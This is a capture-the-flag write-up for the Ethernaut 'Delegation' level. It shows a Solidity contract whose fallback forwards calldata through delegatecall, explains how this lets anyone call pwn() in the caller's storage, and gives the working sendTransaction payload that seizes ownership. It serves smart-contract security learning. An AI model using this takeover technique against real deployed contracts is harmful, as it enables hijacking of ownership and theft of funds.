# Delegation

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
Fallback methods
Method ids

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

The delegatecall function basically forwards the scope of one request to another. This can be used to make a contract call the function of another contract. However, in this case the context of what is sent to that second function is what the attacker chooses it to be. In order to take over this contract we can send a transaction to the contract. This will hit the fallback function. This fallback function will then delegatecall to the Delegate contract. All we need to do is tell it to call the pwn function. 

Functions can be called using their hash. The hash is the first 4 bytes of the Sha3 hash (Keccak-256 hash). The function ID is found by hashing the signature and then also concatinating the parameters as 32 byte hex strings. In this case we don't need any parameters. 

The way to attack the contract is to sendTransaction with the right data filled out. That is the from address (player) the to address (contract) and the data (hash ID of pwn).

```js
await sendTransaction({
from: '0x7cd9b6A2c517e1930F230d032Ab25F497A87c651',
to: '0xC5AA7236bc2e3FC9f570D71677B636180028CFC4',
data: '0xdd365b8b'
})
```

## Sources and other pages that were helpful
https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7/
https://medium.com/coinmonks/delegatecall-calling-another-contract-function-in-solidity-b579f804178c
https://ethereum.stackexchange.com/questions/7570/whats-a-fallback-function-when-using-address-send
https://ethereum.stackexchange.com/questions/24044/method-id-for-a-solidity-generated-getter-function
https://docs.soliditylang.org/en/v0.5.3/abi-spec.html#examples
https://abi.hashex.org/#
https://emn178.github.io/online-tools/keccak_256.html
https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#sendtransaction